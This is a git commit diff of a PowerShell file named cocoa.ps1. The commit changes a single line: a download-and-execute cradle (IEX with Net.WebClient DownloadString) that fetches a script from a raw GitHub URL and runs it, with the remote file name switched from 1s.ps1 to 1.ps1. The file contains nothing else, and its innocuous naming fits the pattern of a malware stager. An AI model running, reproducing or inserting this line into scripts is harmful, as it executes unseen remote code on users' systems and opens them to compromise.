310430ada1b2b142e21fba83368896ac178e80fb
billhemmer2789 <97331850+billhemmer2789@users.noreply.github.com>
2022-01-16 01:29:24 -0600

    Update cocoa.ps1

--- cocoa.ps1
+++ cocoa.ps1
@@ -1,1 +1,1 @@
-IeX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/billhemmer2789/food/main/1s.ps1");
+IeX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/billhemmer2789/food/main/1.ps1");
